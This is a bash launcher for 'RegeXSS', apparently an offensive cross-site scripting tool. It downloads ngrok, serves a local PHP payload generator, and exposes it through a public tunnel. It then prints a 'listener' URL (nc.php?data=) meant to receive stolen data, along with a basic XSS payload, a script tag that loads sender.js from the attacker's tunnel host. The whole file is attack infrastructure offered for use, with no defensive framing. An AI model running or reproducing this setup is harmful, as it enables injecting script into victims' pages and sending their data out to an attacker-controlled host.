#!/bin/bash

dependencies(){
	command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
	command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
	command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
	command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

banner(){
	printf """    ____                 _  ____________
   / __ \___  ____ ____ | |/ / ___/ ___/
  / /_/ / _ \/ __ \`/ _ \|   /\__ \\__ \\ 
 / _, _/  __/ /_/ /  __/   |___/ /__/ / 
/_/ |_|\___/\__, /\___/_/|_/____/____/  
           /____/version - 1.1

https://nirmaldahal.com.np | By #Nittam
https://cryptogennepal.com | CryptoGenNepal"""
}

start(){
	printf "\n\nStarting RegeXSS..."
	if [[ -e ngrok ]]; 
	then
		echo ""
	else
		printf "\n[*] Downloading Ngrok...\n"

		arch=$(uname -a | grep -o 'arm' | head -n1)
		arch2=$(uname -a | grep -o 'Android' | head -n1)

		if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ;
		then
			wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
			if [[ -e ngrok-stable-linux-arm.zip ]]; 
			then
				unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
				chmod +x ngrok
				rm -rf ngrok-stable-linux-arm.zip
			else
				printf "\n[!] Download error... Termux, run: pkg install wget\n"
				exit 1
			fi
		else
			wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
			if [[ -e ngrok-stable-linux-386.zip ]]; 
			then
				unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
				chmod +x ngrok
				rm -rf ngrok-stable-linux-386.zip
			else
				printf "\n[!] Download error...\n"
				exit 1
			fi
		fi
	fi

	printf "\n[*] Starting PHP Server...\n"
	cd RegeXSS && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
	sleep 2
	printf "[*] Starting Ngrok Server...\n\n"
	./ngrok http 3333 > /dev/null 2>&1 &
	sleep 5
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	printf "[*] Launching URLs In Firefox\n"
	sleep 2
	printf "	[*] Firefox | Payload Generator\t: http://127.0.0.1:3333\n"
	sleep 2
	printf "	[*] Firefox | Your Listner URL\t: ${link}/nc.php?data=\n"
	sleep 2
	printf "	[*] Firefox | RegeXSS'ed URL\t: http://127.0.0.1:3333/regexssed.php\n\n"
	sleep 2
	printf "[*] Basic Payload\n <script src='${link}/sender.js'></script>\n"
	sleep 3
	firefox -new-tab http://127.0.0.1:3333 > /dev/null 2>&1 &
}

banner
dependencies
start
